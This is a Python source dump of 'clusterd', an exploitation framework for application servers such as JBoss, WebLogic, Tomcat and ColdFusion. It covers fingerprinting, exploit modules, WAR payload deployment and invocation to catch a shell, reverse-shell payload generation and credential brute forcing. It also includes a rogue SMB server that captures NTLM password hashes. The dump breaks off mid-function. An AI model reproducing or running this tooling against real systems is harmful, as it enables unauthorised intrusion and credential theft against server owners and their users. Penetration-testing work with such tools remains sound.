__FILENAME__ = clusterd
#!/usr/bin/env python

import sys
from shutil import rmtree
from os import getcwd, mkdir, path
sys.path.insert(0, getcwd() + '/src/core/')

from fingerprint import FingerEngine
from src.module import generate_payload, deploy_utils, discovery
from auxengine import auxengine
from parse_cmd import parse
from log import LOG
import utility
import state

""" Clustered environment exploitation framework
"""

def prerun(options):
    """ Run misc flags that don't necessarily have anything to do
    with fingerprinting or exploiting.
    """

    # first check if we need to generate a payload
    if options.generate_payload:
        generate_payload.run(options)

    # Check to see if we need to run the discovery module
    if options.discovery_file:
        discovery.run(options)

    # then check if they want a listing of all deployers
    if options.deploy_list:
        deploy_utils.deploy_list()

    if options.aux_list:
        deploy_utils.auxiliary_list()

    if path.isdir(state.serve_dir):
        # stale temp dir from a crash, etc.
        rmtree(state.serve_dir)

    # create our temporary directory
    mkdir(state.serve_dir)


def postrun(options):
    """ Cleanup routine after everything is done
    """

    rmtree(state.serve_dir, ignore_errors=True)


def run(options):
    """ Parse up our hosts and run fingerprinting/exploitation
    on each one
    """

    servers = []
    if options.input_list:
        with open(options.input_list, 'r') as f:
            for ip in f.readlines():
                if ip.count('.') < 3:
                    rip = utility.resolve_host(ip.strip())
                    if rip:
                        servers.append(rip)
                    else:
                        utility.Msg("Host %s could not be resolved.  Skipping." % 
                                                            ip.strip(), LOG.DEBUG)
                else:
                    servers.append(ip.strip())
                    
        utility.Msg("Loaded %d servers." % len(servers))
    else:
        if options.ip.count('.') < 3:
            ip = utility.resolve_host(options.ip)
            if ip:
                servers.append(ip)
            else:
                utility.Msg("Could not resolve hostname %s" % options.ip, LOG.ERROR)
                return
        else:
            servers.append(options.ip)

    utility.Msg("Servers' OS hinted at %s" % options.remote_os)
    # iterate through all servers, fingerprint and load auxengine
    for server in servers:
        fingerengine = FingerEngine()
        fingerengine.options = options
        fingerengine.options.ip = server

        fingerengine.run()
        if len(fingerengine.fingerprints) is 0:
            continue

        utility.Msg("Fingerprinting completed.", LOG.UPDATE)

        # We've got the host fingerprinted, now kick off the
        # exploitation engine for the service
        utility.Msg("Loading auxiliary for '%s'..." % fingerengine.service,
                                                      LOG.DEBUG)

        # execute the auxiliary engine
        auxengine(fingerengine)

if __name__ == "__main__":
    utility.header()
    options = parse(sys.argv[1:])

    utility.Msg("Started at %s" % (utility.timestamp()))

    # log the CLI args
    utility.log(' '.join(sys.argv))

    try:
        prerun(options)

        if options.ip or options.input_list:
            run(options)

        postrun(options)
    except KeyboardInterrupt:
        pass

    utility.Msg("Finished at %s" % (utility.timestamp()))

########NEW FILE########
__FILENAME__ = auxengine
from os.path import abspath
from argparse import SUPPRESS
from log import LOG
import deployer
import undeployer
import pkgutil
import utility


def auxengine(fingerengine):
    """ Our core auxiliary engine runs as such:

            1. While building the command parser, we load all modules and append their
               CLI flags to a hidden argument parser.

            2. After fingerprinting the remote service, we load all of the platform's
               modules and run check(); this will return True/False as to whether or
               not it applies to the fingerprint.

            3. If the fingerprint applies, we check for --fingerprint, which will
               simply list that it is acceptable.  We also check for the auxiliarys
               hidden flag and, if it exists, we run the auxiliary.
    """

    fpath = [abspath("./src/platform/%s/auxiliary" % fingerengine.service)]
    modules = list(pkgutil.iter_modules(fpath))
    found = []

    for fingerprint in fingerengine.fingerprints:
        for auxiliary in modules:

            mod = auxiliary[0].find_module(auxiliary[1]).load_module(auxiliary[1])

            try:
                mod = mod.Auxiliary()
            except:
                # logged in build_platform_flags
                continue

            if mod.name not in found and mod.check(fingerprint):
                if fingerengine.options.fp and not mod.show:
                    utility.Msg("Vulnerable to %s (--%s)" % (mod.name, mod.flag),
                                                            LOG.SUCCESS)
                elif vars(fingerengine.options)[mod.flag]:
                    mod.run(fingerengine, fingerprint)

                found.append(mod.name)

    if fingerengine.options.deploy:
        deployer.run(fingerengine)

    # also check for undeploy
    if fingerengine.options.undeploy:
        undeployer.run(fingerengine)


def build_platform_flags(platform, egroup):
    """ This builds the auxiliary argument group
    """

    fpath = [abspath("./src/platform/%s/auxiliary" % platform)]
    modules = list(pkgutil.iter_modules(fpath))

    for auxiliary in modules:
        mod = auxiliary[0].find_module(auxiliary[1]).load_module(auxiliary[1])

        try:
            mod = mod.Auxiliary()
        except Exception, e:
            utility.Msg("Auxiliary %s failed to load: %s" % (auxiliary[1], e),
                                                          LOG.DEBUG)
            continue

        if not 'flag' in dir(mod):
            continue

        egroup.add_argument("--%s" % mod.flag, action='store_true', dest=mod.flag,
                        help=mod.name if mod.show else SUPPRESS)

    return egroup

########NEW FILE########
__FILENAME__ = auxiliary
class Auxiliary(object):

    def __init__(self):
        self.name = None        # name of the module
        self.versions = []      # supported versions
        self.show = False       # False for exploits, True for supplimental modules (list/info)
        self.flag = None        # CLI flag

    def check(self, fingerprint):
        """ Given the fingerprint of a remote service, check whether this
        module is relevant.

        True for valid, False for not
        """

        raise NotImplementedError

    def run(self, fingerengine, fingerprint):
        """ Initiates the module
        """

        raise NotImplementedError

########NEW FILE########
__FILENAME__ = cprint
from hashlib import md5
from requests import exceptions
from log import LOG
import utility


""" Abstract fingerprint for modules to inherit from.
"""

class FingerPrint(object):

    def __init__(self):
        self.platform = None    # Platform for the fingerprint
        self.title = None       # Title or interface name
        self.uri = None         # Default URI
        self.port = None        # Default port
        self.hash = None        # md5 hash to check for; this can be a single hash or a list
        self.ssl = False        # establish https connection?

    def check(self, ip, port=None):
        """ Pull the specified URI down and compare the content hash
            against the defined hash.
        """
        try:
            rport = self.port if port is None else port

            url = "{0}://{1}:{2}{3}".format("https" if "ssl" in dir(self) and self.ssl else "http",
                                            ip, rport, self.uri)
            response = utility.requests_get(url)

            utility.Msg("Fetching hash from {0}".format(response.url), LOG.DEBUG)
        
            if response.status_code == 200:

                hsh = md5(response.content).hexdigest()
                if type(self.hash) is list and hsh in self.hash:
                    return True
                elif hsh == self.hash:
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)
        return False

########NEW FILE########
__FILENAME__ = deployer
from src.module.invoke_payload import invoke
from log import LOG
import state
import utility
import importlib
import pkgutil


def run(fingerengine):
    """ This core module is used to load a specific platform's deployers
    and iterate through fingerprints to find one to deploy to.  If the --invoke
    flag was passed, then we automatically run invoke_war, which will call the
    deployed WAR and attempt to catch the shell back.
    """

    # before we do anything, ensure the deploying file exists...
    try:
        with open(fingerengine.options.deploy): pass
    except:
        utility.Msg("File '%s' could not be found." % fingerengine.options.deploy,
                                                      LOG.ERROR)
        return


    utility.Msg("Loading deployers for platform %s" % fingerengine.service, LOG.DEBUG)

    load = importlib.import_module('src.platform.%s.deployers' % fingerengine.service)

    # load all deployers
    modules = list(pkgutil.iter_modules(load.__path__))
    loaded_deployers = []

    for deployer in modules:

        dp = deployer[0].find_module(deployer[1]).load_module(deployer[1])
        if 'deploy' not in dir(dp):
            continue

        loaded_deployers.append(dp)

    # start iterating through fingerprints
    for fingerprint in fingerengine.fingerprints:

        # build list of deployers applicable to this version
        appd = [x for x in loaded_deployers if fingerprint.version in x.versions]
        for deployer in appd:

            if fingerprint.title == deployer.title:
                if fingerengine.options.deployer:

                    # they want to use a specific deployer
                    if not fingerengine.options.deployer in deployer.__name__:
                        continue

                # if the deployer is using waitServe, ensure the user knows
                if 'waitServe' in dir(deployer):
                    r = utility.capture_input("This deployer (%s) requires an external"\
                                   " listening port (%s).  Continue? [Y/n]" % (
                                      deployer.__name__, state.external_port))
                    if 'n' in r.lower():
                        continue

                utility.Msg("Deploying WAR with deployer %s (%s)" %
                                (deployer.title, deployer.__name__), LOG.DEBUG)
                deployer.deploy(fingerengine, fingerprint)

                if fingerengine.options.invoke_payload:
                    invoke(fingerengine, fingerprint, deployer)

                return

    utility.Msg("No valid fingerprints were found to deploy.", LOG.ERROR)

########NEW FILE########
__FILENAME__ = fingerprint
from os.path import abspath
from log import LOG
import pkgutil
import state
import utility


class FingerEngine:
    """ Fingerprinting engine.  Based on service definitions, attempt
    to discover what service is listening, and run various fingerprint
    tests against it.

    If the user hints at a specific service, attempt to first load only
    that engine.  If unsuccessful, load the rest and attempt them.
    """

    def __init__(self):
        self.service = None
        self.fingerprints = []
        self.options = None

    def definitions(self, ip, port, service):
        """ Load and fingerprint the remote system.
        """

        fpath = [abspath("./src/platform/%s/fingerprints" % service)]

        match_fps = []
        fingerprints = list(pkgutil.iter_modules(fpath))
        for fingerprint in fingerprints:
            fp = fingerprint[0].find_module(fingerprint[1]).load_module(fingerprint[1])
            fp = fp.FPrint()

            if self.options.version: 
                # we're looking for a specific version
                if fp.version is not "Any" and self.options.version not in fp.version:
                    continue

            utility.Msg("Checking %s version %s %s..." % (fp.platform,
                                    fp.version, fp.title))

            if fp.check(ip, port):

                # set fingerprint port to match fingerengine port if defined
                if vars(self.options)['port']:
                    fp.port = self.options.port
                match_fps.append(fp)

        return match_fps

    def check_service(self, service):
        """ Given a service, this will initiate our fingerprinting engine against
        the remote host and return a list of all matched fingerprints.  Successful
        fingerprints will also be dumped to console.
        """

        utility.Msg("Loading fingerprint engine '%s'" % service, LOG.DEBUG)

        matched_fingerprints = self.definitions(self.options.ip, self.options.port, service)
        if len(matched_fingerprints) > 0:
            utility.Msg("Matched %d fingerprints for service %s" %
                                        (len(matched_fingerprints), service))

            for fp in matched_fingerprints:
                utility.Msg("\t%s (version %s)" % (fp.title, fp.version), LOG.SUCCESS)
        else:
            utility.Msg("No fingerprints found for service %s" % service)

        return matched_fingerprints

    def run(self):
        """ Kicks off the fingerprint engine
        """

        utility.Msg("Fingerprinting host '%s'" % self.options.ip, LOG.UPDATE)
        state.hasbf = False

        if self.options.remote_service:
            if self.options.remote_service.lower() not in \
                                            state.supported_platforms:
                utility.Msg("Service '%s' unknown or not supported." %
                    self.options.remote_service, LOG.ERROR)
                return False

            self.service = self.options.remote_service
            utility.Msg("Server hinted at '%s'" % self.options.remote_service)


        # if a service was hinted at, load and test it
        if self.service:
            self.fingerprints = self.check_service(self.service)
        else:
            # load one after the other, stop once we find a match
            for service in state.supported_platforms:

                state.hasbf = False
                matched_fps = self.check_service(service)

                if len(matched_fps) > 0:
                    self.service = service
                    self.fingerprints = matched_fps
                    break

########NEW FILE########
__FILENAME__ = log
class LOG:
    """ This class specifies the different logging levels that we support.
    Levels can be trivially added here and in src/core/utility.py#Msg along
    with their pretty output information.
    """

    INFO = 1        # green
    SUCCESS = 2     # bold green
    ERROR = 3       # red
    DEBUG = 4       # blue
    UPDATE = 5      # yellow

########NEW FILE########
__FILENAME__ = parse_cmd
from auxengine import build_platform_flags
from argparse import ArgumentParser
from random import choice
from log import LOG
import state
import utility
import sys


def parse(arguments):
    """ Parse command line options
    """
    parser = ArgumentParser(usage='./clusterd.py [options]')

    #
    # Connection related command line arguments
    #
    connection = parser.add_argument_group("Connection",
                    description = 'Options for configuring the connection')
    connection.add_argument("-i", help='Server address', action='store',
                            dest='ip', metavar='[ip address]')
    connection.add_argument("-iL", help='Server list', action='store',
                            dest='input_list', metavar='[file]')
    connection.add_argument('-p', help='Server port', action='store',
                            dest='port', type=int, metavar='[port]')
    connection.add_argument('--proxy', help='Connect through proxy [http|https]',
                            action='store', dest='proxy',
                            metavar="[proxy://server:port]")
    connection.add_argument('--proxy-auth', help='Proxy credentials',
                               action='store', dest='proxy_auth',
                           metavar='[username:password]')
    connection.add_argument('--timeout', help='Connection timeout [%ds]' % state.timeout,
                               action='store', dest='timeout',
                               default=state.timeout, metavar='[seconds]')
    connection.add_argument("--random-agent", help='Use a random User-Agent for'\
                            ' requests', action='store_true', dest='random_agent',
                            default=False)
    connection.add_argument("--ssl", help='Force SSL', action='store_true',
                            dest='ssl', default=False)

    #
    # Remote host command line arguments
    #
    remote = parser.add_argument_group('Remote Host',
                        description = 'Settings specific to the remote host')
    remote.add_argument('-a', help='Hint at remote host service',
                    action='store', dest='remote_service',
                    metavar='[%s]' % ('|'.join(state.supported_platforms)))
    remote.add_argument('-o', help='Hint at remote host OS',
                    action='store', dest='remote_os',
                    metavar='[windows|linux]', default='windows')
    remote.add_argument('-v', help='Specific version to test', action='store',
                    dest='version', metavar='[version]', default=None)
    remote.add_argument('--usr-auth', help='Login credentials for service',
                    action='store', dest='usr_auth',
                    metavar='[username:password]')
    remote.add_argument('--fingerprint', help='Fingerprint the remote system',
                    action='store_true', dest='fp', default=False)
    remote.add_argument("--arch", help='Specify remote OS architecture',
                    action='store', dest='arch', default='x86',
                    metavar='[x86|x64]')

    #
    # deploy options
    #
    deploy = parser.add_argument_group("Deploy",
                      description = 'Deployment flags and settings')
    deploy.add_argument("--deploy", help='Deploy to the discovered service',
                    action='store', dest='deploy', metavar='[file]')
    deploy.add_argument("--undeploy", help='Undeploy file from server',
                    action='store', dest='undeploy', metavar='[context]')
    deploy.add_argument("--deployer", help="Specify a deployer to use",
                    action='store', dest='deployer', default=None,
                    metavar='[deployer]')
    deploy.add_argument("--invoke", help="Invoke payload after deployment",
                    action='store_true', dest='invoke_payload', default=False)
    deploy.add_argument("-b", help="Brute force credentials for user [admin]", action='store',
                    dest='bf_user', metavar='[user]', default='admin')
    deploy.add_argument('--wordlist', help='Wordlist for brute forcing passwords',
                    action='store', dest='wordlist', default=None,
                    metavar='[path]')

    #
    # iterate over our supported platforms and build their
    # auxiliary modules
    #
    for platform in state.supported_platforms:

        group = parser.add_argument_group(platform + " modules")
        group = build_platform_flags(platform, group)


    other = parser.add_argument_group("Other",
                            description='Miscellaneous flags')
    other.add_argument("--deployer-list", help="List all available deployers",
                    action='store_true', dest='deploy_list', default=False)
    other.add_argument("--aux-list", help="List all available exploits",
                    action='store_true', dest='aux_list', default=False)
    other.add_argument("--gen-payload", help='Generate a reverse shell payload',
                     action='store', dest='generate_payload',
                     metavar='[host:port] for reverse connection')
    other.add_argument("--discover",help="Attempt to discover application servers using the specified nmap gnmap output (use -sV when scanning)",
                     action="store",dest='discovery_file',metavar='[discovery_file]')
    other.add_argument("--listen", help='Adapter to listen on when needed',
                    action='store', dest='listener', metavar='[adapter]',
                    default=None)
    other.add_argument("-d", help='Enable debug output', action='store_true',
                    dest='debug', default=False)
    other.add_argument("-l", help='Log output to file [$time$_log.log]',
                    dest='flog', action='store_true', default=False)

    # parse cli options
    options = parser.parse_args(arguments)

    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    #
    # Setup state variables from given flags
    #
    if options.proxy:
        state.proxy = options.proxy

    if options.proxy_auth:
        state.proxy_auth = options.proxy_auth

    if options.debug:
        state.isdebug = True

    if options.usr_auth:
        state.usr_auth = options.usr_auth

    if options.wordlist:
        state.bf_wordlist = options.wordlist

    if options.random_agent:
        # select a random user-agent from the list
        state.random_agent = choice(list(open('./src/lib/user-agents.txt'))).rstrip()
        utility.Msg("Random user agent '%s' selected" % (state.random_agent), LOG.DEBUG)

    if options.listener:
        state.listener = options.listener

    state.ssl = options.ssl
    state.bf_user = options.bf_user
    state.flog = ("%s_log.log" % utility.timestamp().replace(' ', '_') if options.flog else None)

    try:
        state.timeout = float(options.timeout)
    except:
        utility.Msg("Timeout value must be an integer.  Defaulting to %d."
                        % state.timeout, LOG.ERROR)

    return options

########NEW FILE########
__FILENAME__ = state
""" State class for defining clusterd wide variables.  These are mainly set
by parsing command line arguments, but can be modified individually if necessary.
"""

# supported platforms by clusterd
supported_platforms = ['jboss', 'coldfusion', 'weblogic', 'tomcat', 'railo',
                       'axis2']

# proxy to use for outgoing connections
proxy = None

# if necessary, authentication credentials for the aforementioned
# proxy.  This should be in the format username:password
proxy_auth = None

# credentials to authenticate to the service with.  This should be in
# the form username:password
usr_auth = None

# whether or not we are dumping debug strings
isdebug = False

# connection timeout to remote hosts
timeout = 5.0

# wordlist for brute forcing credentials
bf_wordlist = None

# with a loaded wordlist, use the following user to brute force
bf_user = None

# we don't want to brute force services more than once; resets after
# each service
hasbf = False

# if we're using a random User-Agent for requests, set that here
random_agent = None

# sets our HTTP type; default is http, but --ssl sets https
ssl = False

# filename for logging to file
flog = None

# for deployers that need to serve files to remote hosts,
# we copy payloads into this location and clean it at
# the end 
serve_dir = "/tmp/.clusterd"

# for modules that require a binding IP for accepting connections, such
# as smb_hashes, this defines which adapter to bind to.  If none is specified
# the first adapter in the list is selected.
listener = None

# some modules require the remote server to come back and grab a file.
# This variable will determine what port it makes the connection back to
external_port = 8000

########NEW FILE########
__FILENAME__ = undeployer
from importlib import import_module
from log import LOG
import utility

def run(fingerengine):
    """ Undeploying is much simpler than deploying; we have a single undeploy
    file that supports a list of interfaces.
    """

    try:
        undeployer = import_module("src.platform.%s.undeployer" % fingerengine.service)
    except:
        utility.Msg("No undeployer found for platform %s" % fingerengine.service, LOG.ERROR)
        return

    for fingerprint in fingerengine.fingerprints:

        if fingerprint.title in undeployer.titles:
            undeployer.undeploy(fingerengine, fingerprint)
            return

    utility.Msg("No valid fingerprints were found to undeploy.", LOG.ERROR)

########NEW FILE########
__FILENAME__ = utility
from datetime import date, datetime
from commands import getoutput
from socket import gethostbyname
from log import LOG
import state
import requests

""" Utility functions
"""

def Msg(string, level=LOG.INFO):
    """ Output a formatted message dictated by the level.  The levels are:
            INFO - Informational message, i.e. progress
            SUCCESS - Action successfully executed/completed, i.e. WAR deployed
            ERROR - An error of some sort has occured
            DEBUG - Debugging output
            UPDATE - Status updates, i.e. host fingerprinting completed
    """

    if level is LOG.INFO:
        print '\033[32m [%s] %s\033[0m' % (timestamp(), string)
    elif level is LOG.SUCCESS:
        print '\033[1;32m [%s] %s\033[0m' % (timestamp(), string)
    elif level is LOG.ERROR:
        print '\033[31m [%s] %s\033[0m' % (timestamp(), string)
    elif level is LOG.DEBUG:
        if state.isdebug:
            print '\033[34m [%s] %s\033[0m' % (timestamp(), string)
    elif level is LOG.UPDATE:
        print '\033[33m [%s] %s\033[0m' % (timestamp(), string)

    if level is LOG.DEBUG and not state.isdebug:
        return

    log(string)


def log(string):
    """ Logs a string to the state log file.
    """

    if state.flog:
        with open(state.flog, 'a+') as f:
            f.write('[%s] %s\n' % (timestamp(), string))


def header():
    """ Dumps the application header, printed once at startup.
    """

    print '\033[32m\n\t\tclusterd/%s - clustered attack toolkit\033[0m' % version()
    print '\t\t\t\033[33m[Supporting %d platforms]\033[0m' % (len(state.supported_platforms)) 
    print ''


def version():
    """ clusterd version string, which is printed in the header and will
    be used when checking for updates.
    """

    return "0.3"


def timestamp():
    """ Returns a timestamp in the format year-month-day time
    """

    return '%s %s' % (date.today().isoformat(),
                            datetime.now().strftime('%I:%M%p'))


def local_address():
    """ Return local adapter's IP address.  If a specific adapter
    is specified, we grab that one, else we grab the first adapter's
    IP address in the list.

    If this turns out to cause issues for other platforms, we may
    want to look into third party modules, such as netinet
    """
    
    adapter = None        
    ifconfig = getoutput("/sbin/ifconfig")
    if state.listener:
        ifconfig = ifconfig.split("\n")
        for idx in xrange(len(ifconfig)):
            if state.listener in ifconfig[idx]:
                adapter = ifconfig[idx+1].split()[1][5:]
    else:
        adapter = ifconfig.split("\n")[1].split()[1][5:]

    if not adapter:
        Msg("Unable to find adapter %s" % state.listener, LOG.ERROR)

    return adapter


def build_request(args, kwargs):
    """ This function is used for building requests' objects by adding
    state-wide arguments, such as proxy settings, user agents, and more.
    All requests are built using this function.
    """

    if state.proxy:
        (proxy, server, port) = state.proxy.split(":")
        connection = "{0}:{1}:{2}".format(proxy, server, port)
        if state.proxy_auth:
            (usr, pswd) = state.proxy_auth.split(":")
            connection = "{0}://{1}:{2}@{3}:{4}".format(proxy, usr, pswd, server, port)
        kwargs['proxies'] = dict({proxy:connection})

    if state.random_agent:
        ua = {'User-Agent' : state.random_agent}
        if 'headers' in kwargs:
            kwargs['headers'].update(ua)
        else:
            kwargs['headers'] = ua

    # enable https connections; it's kind of a transparent way of upgrading all
    # existing URL strings, and may not be the best solution.  TODO?
    if state.ssl:
        if "http" in args[0] and "https" not in args[0]:
            args = (args[0].replace("http", "https", 1), )

    if not 'timeout' in kwargs.keys():
        kwargs['timeout'] = state.timeout

    kwargs['verify'] = False
    return (args, kwargs)


def requests_get(*args, **kwargs):
    """ Generate a GET request
    """

    (args, kwargs) = build_request(args, kwargs)
    Msg("Making GET request to {0} with arguments {1}".format(args[0], kwargs),
                                                       LOG.DEBUG)
    return requests.get(*args, **kwargs)


def requests_post(*args, **kwargs):
    """ Generate a POST request
    """

    (args, kwargs) = build_request(args, kwargs)
    Msg("Making POST request to {0} with arguments {1}".format(args[0], kwargs),
                                                        LOG.DEBUG)
    return requests.post(*args, **kwargs)


def requests_head(*args, **kwargs):
    """ Generate a HEAD request
    """

    (args, kwargs) = build_request(args, kwargs)
    Msg("Making HEAD request to {0} with args {1}".format(args[0], kwargs),
                                                   LOG.DEBUG)
    return requests.head(*args, **kwargs)


def requests_put(*args, **kwargs):
    """ Generate a PUT request
    """

    (args, kwargs) = build_request(args, kwargs)
    Msg("Making PUT request to {0} with args {1}".format(args[0], kwargs),
                                                  LOG.DEBUG)
    return requests.put(*args, **kwargs)


def capture_input(output_string):
    """ Capture and return user input
    """

    try:
        tmp = raw_input(' \033[1;37m[%s] %s > \033[0m' % (timestamp(), output_string))
    except KeyboardInterrupt:
        return None
    return tmp


def resolve_host(hostname):
    """ Attempts to resolve a hostname into an IP address
    """

    try:
        ip = gethostbyname(hostname)
    except:
        ip = None
    return ip

########NEW FILE########
__FILENAME__ = cifstrap
import socket
import time
import struct
import sys
import threading
import datetime

""" Bulk of this code is credited to bwall (@botnet_hunter) 
This was modified to be quieter and to support NTLMv1

Simple CIFS service that obtains the hash and rejects the connection.

Original:
    https://github.com/bwall/BAMF/blob/master/IntegrationQueue/static/cifstrap.py
"""


class Handler(threading.Thread):
    def __init__(self, conn, addr):
        threading.Thread.__init__(self)
        self.conn = conn
        self.addr = addr
        self.data = None

    def run(self):
        try:
            #get negotiate_protocol_request
            negotiate_protocol_request = self.conn.recv(1024)
            if not negotiate_protocol_request:
                self.conn.close()
                return

            dialect_location = 40
            dialect_index = 0
            dialect_name = ""
            while dialect_location < negotiate_protocol_request.__len__():
                dialect_name = ""
                while ord(negotiate_protocol_request[dialect_location]) != 0x00:
                    if ord(negotiate_protocol_request[dialect_location]) != 0x02:
                        dialect_name += negotiate_protocol_request[dialect_location]
                    dialect_location += 1
                if dialect_name == "NT LM 0.12":
                    break
                dialect_index += 1
                dialect_location += 1

            #netbios session service
            negotiate_protocol_response = "\x00\x00\x00\x51"

            #SMB Header
            #Server Component
            negotiate_protocol_response += "\xff\x53\x4d\x42"
            #SMB Command
            negotiate_protocol_response += "\x72"
            #NT Status
            negotiate_protocol_response += "\x00\x00\x00\x00"
            #Flags
            negotiate_protocol_response += "\x88"
            #Flags2
            negotiate_protocol_response += "\x01\xc0"
            #Process ID High
            negotiate_protocol_response += "\x00\x00"
            #Signature
            negotiate_protocol_response += "\x00\x00\x00\x00\x00\x00\x00\x00"
            #Reserved
            negotiate_protocol_response += "\x00\x00"
            #Tree ID
            negotiate_protocol_response += negotiate_protocol_request[28] + negotiate_protocol_request[29]
            #Process ID
            negotiate_protocol_response += negotiate_protocol_request[30] + negotiate_protocol_request[31]
            #User ID
            negotiate_protocol_response += negotiate_protocol_request[32] + negotiate_protocol_request[33]
            #Multiplex ID
            negotiate_protocol_response += negotiate_protocol_request[34] + negotiate_protocol_request[35]

            #Negotiate Protocol Response
            #Word Count
            negotiate_protocol_response += "\x11"
            #Dialect Index
            negotiate_protocol_response += chr(dialect_index) + "\x00"
            #Security Mode
            negotiate_protocol_response += "\x03"
            #Max Mpx Count
            negotiate_protocol_response += "\x02\x00"
            #Max VCs
            negotiate_protocol_response += "\x01\x00"
            #Max Buffer Size
            negotiate_protocol_response += "\x04\x11\x00\x00"
            #Max Raw Buffer
            negotiate_protocol_response += "\x00\x00\x01\x00"
            #Session Key
            negotiate_protocol_response += "\x00\x00\x00\x00"
            #Capabilities
            negotiate_protocol_response += "\xfd\xe3\x00\x00"
            #System Time
            negotiate_protocol_response += "\x00" * 8
            #UTC Offset in minutes
            negotiate_protocol_response += "\x00\x00"
            #Key Length
            negotiate_protocol_response += "\x08"
            #Byte Count
            negotiate_protocol_response += "\x0c\x00"
            #Encryption Key
            negotiate_protocol_response += "\x11\x22\x33\x44\x55\x66\x77\x88"
            #Primary Domain
            negotiate_protocol_response += "\x00\x00"
            #Server
            negotiate_protocol_response += "\x00\x00"

            self.conn.sendall(negotiate_protocol_response)
            for x in range(0, 2):
                ntlmssp_request = self.conn.recv(1024)
                if ntlmssp_request.__len__() < 89 + 32 + 8 + 16:
                    continue

                nt_len = struct.unpack('<H', ntlmssp_request[53:55])[0]
                if nt_len == 24 and ntlmssp_request[8:10] == '\x73\x00':
                    # NTLMv1
                    lm_len = struct.unpack('<H', ntlmssp_request[51:53])[0]
                    cc = struct.unpack('<H', ntlmssp_request[63:65])[0]
                    pack = tuple(ntlmssp_request[89+24:].split("\x00\x00\x00"))[:2]
                    var = [x.replace('\x00','') for x in ntlmssp_request[89+24:cc+60].split('\x00\x00\x00')[:2]]
                    (account, domain) = tuple(var)
                    self.data = '{0}::{1}:112233445566778899:{2}:{3}'.format(account, domain,
                                ntlmssp_request[65:65+lm_len].encode('hex').upper(),
                                ntlmssp_request[65+lm_len:65+lm_len+nt_len].encode('hex').upper())
                elif nt_len > 24:
                    # NTLMv2
                    hmac = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89, 89 + 16))
                    header = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89 + 16, 89 + 20))
                    challenge = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89 + 24, 89 + 32 + 8))
                    tail = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89 + 32 + 8, 89 + 32 + 8 + 16))

                    tindex = 89 + 32 + 8 + 16 + 1
                    account = ""
                    while ord(ntlmssp_request[tindex]) != 0x00:
                        account += chr(ord(ntlmssp_request[tindex]))
                        tindex += 2

                    tindex += 2
                    domain = ""
                    while ord(ntlmssp_request[tindex]) != 0x00:
                        domain += chr(ord(ntlmssp_request[tindex]))
                        tindex += 2

                    self.data = "{0}::{1}:1122334455667788:{2}:{3}00000000{4}{5}".format(
                                    account, domain, hmac, header, challenge, tail)

                #netbios session service
                ntlmssp_failed = "\x00\x00\x00\x23"

                #SMB Header
                #Server Component
                ntlmssp_failed += "\xff\x53\x4d\x42"
                #SMB Command
                ntlmssp_failed += "\x73"
                #NT Status
                ntlmssp_failed += "\x6d\x00\x00\xc0"
                #Flags
                ntlmssp_failed += "\x88"
                #Flags2
                ntlmssp_failed += "\x01\xc8"
                #Process ID Hight
                ntlmssp_failed += "\x00\x00"
                #Signature
                ntlmssp_failed += "\x00\x00\x00\x00\x00\x00\x00\x00"
                #Reserved
                ntlmssp_failed += "\x00\x00"
                #Tree ID
                ntlmssp_failed += ntlmssp_request[28] + ntlmssp_request[29]
                #Process ID
                ntlmssp_failed += ntlmssp_request[30] + ntlmssp_request[31]
                #User ID
                ntlmssp_failed += ntlmssp_request[32] + ntlmssp_request[33]
                #Multiplex ID
                ntlmssp_failed += ntlmssp_request[34] + ntlmssp_request[35]

                #Negotiate Protocol Response
                #Word Count
                ntlmssp_failed += "\x00\x00\x00"
                self.conn.sendall(ntlmssp_failed)

            self.conn.close()

        except Exception, e:
            self.data = e

########NEW FILE########
__FILENAME__ = deploy_utils
from src.platform.weblogic.interfaces import WINTERFACES
from time import sleep
from subprocess import Popen, PIPE, check_output
from requests import get
from signal import SIGINT
from os import kill, system
from sys import stdout
from log import LOG
import importlib
import pkgutil
import state
import utility


def _serve(war_file = None):
    """ Launch a SimpleHTTPServer listener to serve up our WAR file
    to the requesting host.  This is used primarily to serve a WAR
    to JBoss' jmx_deployer.

    If war_file is provided, this will make a copy of this file into
    our temp dir and remove it once its been completed.
    """

    try:
        if war_file:
            system("cp %s %s 2>/dev/null" % (war_file, state.serve_dir))

        proc = Popen(["python", "-m", "SimpleHTTPServer", str(state.external_port)],
                        stdout=PIPE, stderr=PIPE, cwd=state.serve_dir)

        while 'GET' not in proc.stderr.readline():
            sleep(1.0)

        # this might be too short for huge files
        sleep(3.0)

    except Exception, e:
        utility.Msg(e, LOG.DEBUG)
    finally:
        kill(proc.pid, SIGINT)

    if war_file:
        war_name = war_file.rsplit('/', 1)[1]
        # remove our copied file
        system("rm -f %s/%s" % (war_name, state.serve_dir))


def waitServe(servert):
    """ Small function used to wait for a _serve thread to receive
    a GET request.  See _serve for more information.

    servert should be a running thread.
    """

    timeout = 10
    status = False

    try:
        while servert.is_alive() and timeout > 0:
            stdout.flush()
            stdout.write("\r\033[32m [%s] Waiting for remote server to "
                         "download file [%ds]" % (utility.timestamp(), timeout))
            sleep(1.0)
            timeout -= 1
    except:
        timeout = 0

    if timeout is not 10:
        print ''

    if timeout is 0:
        utility.Msg("Remote server failed to retrieve file.", LOG.ERROR)
    else:
        status = True

    return status


def wc_invoke(url, local_url, usr = None, pswd = None):
    """ Invoke the webconsole deployer
    """

    res = None
    try:
        res = check_output(["./webc_deploy.sh", url, local_url, str(usr),
                            str(pswd)],
                            cwd="./src/lib/jboss/webconsole_deploy")
    except Exception, e:
        utility.Msg(e, LOG.DEBUG)
        res = e

    return res


def invkdeploy(version, url, local_url, random_int):
    """
    """

    res = None
    creds = None
    if state.usr_auth != None:
        creds = state.usr_auth.split(':')
    try:
        if creds != None:
            res = check_output(["./invkdeploy.sh", version, url, 
                                local_url, str(random_int),creds[0],creds[1]],
                                cwd="./src/lib/jboss/jmxinvoke_deploy")
        else:
            res = check_output(["./invkdeploy.sh", version, url, 
                                local_url, str(random_int)],
